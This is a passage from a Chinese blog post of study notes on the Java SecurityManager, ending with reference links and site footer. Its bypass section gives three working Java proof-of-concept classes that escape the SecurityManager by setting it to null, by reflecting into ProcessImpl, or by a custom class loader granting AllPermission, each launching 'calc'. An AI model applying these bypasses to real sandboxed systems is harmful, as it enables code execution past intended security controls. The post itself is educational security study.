+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SetSecurityManagerNullBypass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SetSecurityManagerNullBypass().exec();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//TODO 编译运行 -Djava.security.manager -Djava.security.policy==your.policy</span></span><br><span class="line">        <span class="comment">// grant &#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "setSecurityManager";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置SecurityManager为null 绕过check</span></span><br><span class="line">        System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、通过反射权限执行恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassByReflection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-reflection.policy</span></span><br><span class="line">        <span class="comment">// bypass-by-reflection.policy:</span></span><br><span class="line">        <span class="comment">// grant &#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "accessDeclaredMembers";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//        executeCommandWithReflection("calc");</span></span><br><span class="line">        exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">executeCommandWithReflection</span><span class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            method.invoke(clz, <span class="keyword">new</span> String[]&#123;command&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、通过赋予加载器权限，自定义加载器来执行恶意代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassByClassloader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-createclassloader.policy</span></span><br><span class="line">        <span class="comment">// grant&#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "createClassLoader";</span></span><br><span class="line">        <span class="comment">//    permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        MyClassLoader mcl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; c1 = Class.forName(<span class="string">"com.r17a.commonvuln.securitymiconfig.securitymanager.Evil"</span>, <span class="keyword">true</span>, mcl);</span><br><span class="line">            Object obj = c1.newInstance();</span><br><span class="line">            System.out.println(obj.getClass().getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IllegalAccessException | InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//call defineClazz not super.defineClass</span></span><br><span class="line">            <span class="keyword">return</span> defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc = <span class="keyword">new</span> Permissions();</span><br><span class="line">            pc.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置ProtectionDomain</span></span><br><span class="line">            ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                                                       pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> File <span class="title">getClassFile</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./"</span> + name + <span class="string">".class"</span>);</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBytes(File file) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        FileChannel fc = fis.getChannel();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        WritableByteChannel wbc = Channels.newChannel(baos);</span><br><span class="line">        ByteBuffer by = ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fc.read(by);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            by.flip();</span><br><span class="line">            wbc.write(by);</span><br><span class="line">            by.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-参考链接："><a href="#0x04-参考链接：" class="headerlink" title="0x04 参考链接："></a>0x04 参考链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;essential&#x2F;environment&#x2F;security.html</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;api&#x2F;java&#x2F;lang&#x2F;SecurityManager.html</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;technotes&#x2F;guides&#x2F;security&#x2F;PolicyFiles.html</span><br><span class="line">https:&#x2F;&#x2F;c0d3p1ut0s.github.io&#x2F;%E6%94%BB%E5%87%BBJava%E6%B2%99%E7%AE%B1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;codeplutos&#x2F;java-security-manager-bypass</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;technotes&#x2F;guides&#x2F;security&#x2F;doprivileged.html</span><br><span class="line">https:&#x2F;&#x2F;tech101.cn&#x2F;2019&#x2F;08&#x2F;15&#x2F;AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Java-SecurityManager是什么"><span class="toc-number">1.</span> <span class="toc-text">0x01 Java SecurityManager是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-SecurityManager应用场景："><span class="toc-number">1.1.</span> <span class="toc-text">Java SecurityManager应用场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何启动SecurityManager？"><span class="toc-number">1.2.</span> <span class="toc-text">如何启动SecurityManager？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#管理SecurityManager配置文件："><span class="toc-number">1.3.</span> <span class="toc-text">管理SecurityManager配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过一个例子理解SecurityManager的作用"><span class="toc-number">1.4.</span> <span class="toc-text">通过一个例子理解SecurityManager的作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-AccessController"><span class="toc-number">2.</span> <span class="toc-text">0x02 AccessController</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#域模型："><span class="toc-number">2.1.</span> <span class="toc-text">域模型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AccessController-checkPermission工作机制"><span class="toc-number">2.2.</span> <span class="toc-text">AccessController.checkPermission工作机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AccessController-doPrivileged-授予特权"><span class="toc-number">2.3.</span> <span class="toc-text">AccessController.doPrivileged()授予特权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Java-SecurityManager绕过"><span class="toc-number">3.</span> <span class="toc-text">0x03 Java SecurityManager绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考链接："><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java SecurityManager学习&body=Check out this article: http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=Java SecurityManager学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
